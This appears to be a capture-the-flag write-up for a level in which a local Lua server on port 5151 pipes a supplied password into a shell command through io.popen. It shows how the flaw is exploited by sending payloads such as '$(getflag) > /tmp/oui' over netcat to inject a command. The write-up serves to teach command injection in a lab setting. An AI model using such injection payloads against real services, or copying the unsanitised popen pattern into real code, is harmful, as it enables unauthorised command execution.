`cat level11.lua` </br>
A server seems to be server set up on our localhost on port 5151. It will ask for a passord, will sends this password in a hash function, will apply a sha1sum on it, will return the 40 first characters of it, and will do a useless `if else` condition.

`prog = io.popen("echo "..pass.." | sha1sum", "r")` </br>
`The popen() function opens a process by creating a pipe, forking, and invoking the shell.`</br>
https://linux.die.net/man/3/popen</br>

popen is known for its vunerability to command injections, as it will execute code (see below). </br>
https://www.stigviewer.com/stig/application_security_and_development/2018-12-24/finding/V-70261

So io.popen starts a program in a separated process and returns a file handle that you can use to read data from this program or to write data to this program.

So the program level11.lua will execute `echo "..pass.." | sha1sum`. We saw in a previous level that echo with double quote will execute any command which is written like this `$(command)`.

So we should listen to the port 5151: </br>
`nc localhost 5151`</br>
`Password: $(getflag)`</br>
don't return the flag.

Maybe on a different file: </br>
`nc localhost 5151`</br>
`Password: $(getflag) > /tmp/oui`</br>
`cat /tmp/oui` gives us the flag.
